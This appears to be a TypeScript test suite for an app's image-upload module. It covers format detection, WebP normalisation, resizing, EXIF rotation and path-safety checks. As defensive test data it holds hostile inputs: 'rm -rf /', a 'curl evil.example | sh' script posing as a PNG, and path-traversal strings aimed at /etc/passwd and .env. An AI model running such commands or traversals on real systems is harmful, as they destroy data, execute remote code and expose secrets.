import { mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

// UPLOAD_DIR is read at import time, so it has to be set before the module
// under test is loaded.
const dir = await mkdtemp(join(tmpdir(), 'kadlio-uploads-'));
process.env.UPLOAD_DIR = dir;

const {
  deleteUpload,
  detectImageType,
  etagFor,
  mimeForFile,
  resolveUploadPath,
  storeUpload,
} = await import('./uploads');

/**
 * Header-only buffers: enough for the magic-byte check, which is all the
 * detection tests need.
 */
const PNG = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0]);
const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0, 0, 0]);
const GIF = Buffer.from('GIF89a-------', 'ascii');
const WEBP = Buffer.concat([
  Buffer.from('RIFF', 'ascii'),
  Buffer.from([0, 0, 0, 0]),
  Buffer.from('WEBP', 'ascii'),
  Buffer.from([0, 0, 0, 0]),
]);

/**
 * Real images, needed once storing means decoding. Built rather than
 * committed as fixtures so the dimensions are visible in the test.
 */
const sharp = (await import('sharp')).default;

function image(width: number, height: number, format: 'png' | 'jpeg' = 'png') {
  const canvas = sharp({
    create: {
      width,
      height,
      channels: 3,
      background: { r: 200, g: 80, b: 60 },
    },
  });
  return format === 'png' ? canvas.png().toBuffer() : canvas.jpeg().toBuffer();
}

function asFile(bytes: Buffer, name: string, type = 'image/png') {
  return new File([new Uint8Array(bytes)], name, { type });
}

describe('recognising an image', () => {
  it('accepts the four formats we support', () => {
    expect(detectImageType(PNG)?.ext).toBe('png');
    expect(detectImageType(JPEG)?.ext).toBe('jpg');
    expect(detectImageType(GIF)?.ext).toBe('gif');
    expect(detectImageType(WEBP)?.ext).toBe('webp');
  });

  it('rejects something that is not an image', () => {
    expect(detectImageType(Buffer.from('#!/bin/sh\nrm -rf /', 'ascii'))).toBeNull();
  });
});

describe('storing an upload', () => {
  it('writes the file and returns a path under /uploads', async () => {
    const result = await storeUpload(asFile(await image(40, 30), 'photo.png'), 'gifts');
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    // Everything is WebP once stored, whatever arrived.
    expect(result.path).toMatch(/^\/uploads\/gifts\/[\w-]+\.webp$/);
    const onDisk = await readFile(join(dir, 'gifts', result.path.split('/').pop()!));
    expect(detectImageType(onDisk)?.ext).toBe('webp');
  });

  /**
   * The browser's Content-Type is a claim, not evidence. A script renamed
   * .png and declared image/png would sail through a MIME-only check.
   */
  it('refuses a script dressed up as a PNG', async () => {
    const evil = Buffer.from('#!/bin/sh\ncurl evil.example | sh', 'ascii');
    const result = await storeUpload(asFile(evil, 'photo.png', 'image/png'), 'gifts');

    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.error).toMatch(/Format non reconnu/);
  });

  it('names the file itself rather than trusting the uploader', async () => {
    const result = await storeUpload(
      asFile(await image(20, 20), '../../../etc/passwd.png'),
      'gifts',
    );
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    // Nothing of the supplied name survives.
    expect(result.path).not.toContain('..');
    expect(result.path).not.toContain('passwd');
  });

  it('refuses a file over the size limit', async () => {
    const huge = new File(
      [new Uint8Array(Buffer.alloc(5 * 1024 * 1024, 1))],
      'big.png',
      { type: 'image/png' },
    );
    const result = await storeUpload(huge, 'gifts');
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.error).toMatch(/4 Mo/);
  });

  it('refuses an empty file', async () => {
    const result = await storeUpload(asFile(Buffer.alloc(0), 'empty.png'), 'gifts');
    expect(result.ok).toBe(false);
  });

  it('gives two uploads of identical bytes separate paths', async () => {
    const bytes = await image(20, 20);
    const a = await storeUpload(asFile(bytes, 'a.png'), 'gifts');
    const b = await storeUpload(asFile(bytes, 'b.png'), 'gifts');
    expect(a.ok && b.ok && a.path !== b.path).toBe(true);
  });
});

describe('normalising what gets stored', () => {
  async function stored(bytes: Buffer, kind: 'gifts' | 'avatars' = 'gifts') {
    const result = await storeUpload(asFile(bytes, 'x.png'), kind);
    if (!result.ok) throw new Error(result.error);
    const file = await readFile(join(dir, kind, result.path.split('/').pop()!));
    return { file, meta: await sharp(file).metadata() };
  }

  it('converts everything to WebP', async () => {
    const { meta } = await stored(await image(50, 50, 'jpeg'));
    expect(meta.format).toBe('webp');
  });

  /**
   * The whole point of normalising: an oversized photo comes back inside the
   * bound on its longest edge, so the layout can show it whole at a known
   * cost instead of cropping to stay regular.
   */
  it('scales a large image down to the bound', async () => {
    const { meta } = await stored(await image(3000, 2000));
    expect(Math.max(meta.width!, meta.height!)).toBe(1600);
  });

  it('keeps the proportions, so nothing is cropped', async () => {
    // A 3:2 photo must still be 3:2 afterwards; a changed ratio would mean
    // pixels were cut off or squashed.
    const { meta } = await stored(await image(3000, 2000));
    expect(meta.width! / meta.height!).toBeCloseTo(1.5, 2);
  });

  it('handles a tall image as readily as a wide one', async () => {
    const { meta } = await stored(await image(800, 2400));
    expect(meta.height).toBe(1600);
    expect(meta.width).toBe(Math.round(1600 * (800 / 2400)));
  });

  it('leaves a small image at its own size rather than blowing it up', async () => {
    const { meta } = await stored(await image(120, 90));
    expect(meta.width).toBe(120);
    expect(meta.height).toBe(90);
  });

  it('holds avatars to a tighter bound than gift photos', async () => {
    const { meta } = await stored(await image(2000, 2000), 'avatars');
    expect(Math.max(meta.width!, meta.height!)).toBe(512);
  });

  it('makes a heavy photograph dramatically smaller', async () => {
    // A camera-sized JPEG is the case that motivated this: it should land
    // well under a megabyte without the layout doing any work.
    const original = await image(4000, 3000, 'jpeg');
    const { file } = await stored(original);
    expect(file.length).toBeLessThan(original.length);
    expect(file.length).toBeLessThan(1024 * 1024);
  });

  /**
   * A phone held sideways records the rotation as EXIF metadata rather than
   * rotating the pixels. Stripping that metadata without applying it first
   * would store every such photo on its side.
   */
  it('applies the EXIF rotation before discarding it', async () => {
    const landscape = await image(400, 200, 'jpeg');
    const asShot = await sharp(landscape)
      .withMetadata({ orientation: 6 })
      .jpeg()
      .toBuffer();

    const { meta } = await stored(asShot);

    // 400x200 tagged "rotate 90" is really a 200x400 portrait.
    expect(meta.width).toBe(200);
    expect(meta.height).toBe(400);
  });

  it('refuses a file whose header is valid but whose body is not', async () => {
    // Passes the magic-byte check, then fails to decode.
    const truncated = Buffer.concat([
      Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
      Buffer.alloc(64, 7),
    ]);
    const result = await storeUpload(asFile(truncated, 'broken.png'), 'gifts');
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.error).toMatch(/illisible/);
  });
});

describe('resolving a stored path', () => {
  it('accepts a well-formed name', () => {
    expect(resolveUploadPath('gifts', 'abc-123.png')).toContain('gifts');
  });

  /** The router hands us raw segments; none of these may escape the directory. */
  it.each([
    ['gifts', '../../../etc/passwd'],
    ['gifts', '..%2F..%2Fetc%2Fpasswd'],
    ['../secrets', 'a.png'],
    ['gifts', 'a.png/../../b'],
    ['gifts', 'shell.sh'],
    ['gifts', '.env'],
  ])('refuses %s / %s', (kind, name) => {
    expect(resolveUploadPath(kind, name)).toBeNull();
  });
});

describe('deleting an upload', () => {
  it('removes a file we stored', async () => {
    const result = await storeUpload(
      asFile(await image(20, 20, 'jpeg'), 'x.jpg', 'image/jpeg'),
      'avatars',
    );
    expect(result.ok).toBe(true);
    if (!result.ok) return;

    await deleteUpload(result.path);
    await expect(
      readFile(join(dir, 'avatars', result.path.split('/').pop()!)),
    ).rejects.toThrow();
  });

  it('ignores an external URL rather than trying to unlink it', async () => {
    // Gifts may carry an imageUrl that was never an upload.
    await expect(
      deleteUpload('https://example.com/photo.png'),
    ).resolves.toBeUndefined();
  });

  it('will not delete outside the upload directory', async () => {
    const outside = join(dir, 'keep-me.txt');
    await writeFile(outside, 'still here');

    await deleteUpload('/uploads/gifts/../../keep-me.txt');

    expect((await readFile(outside)).toString()).toBe('still here');
  });

  it('treats an already-missing file as success', async () => {
    await expect(
      deleteUpload('/uploads/gifts/does-not-exist.png'),
    ).resolves.toBeUndefined();
  });
});

describe('serving metadata', () => {
  it('maps each extension to its type', () => {
    expect(mimeForFile('a.png')).toBe('image/png');
    expect(mimeForFile('a.jpg')).toBe('image/jpeg');
    expect(mimeForFile('a.webp')).toBe('image/webp');
    expect(mimeForFile('a.gif')).toBe('image/gif');
  });

  it('gives identical bytes the same etag and different bytes another', () => {
    expect(etagFor(PNG)).toBe(etagFor(Buffer.from(PNG)));
    expect(etagFor(PNG)).not.toBe(etagFor(JPEG));
  });
});
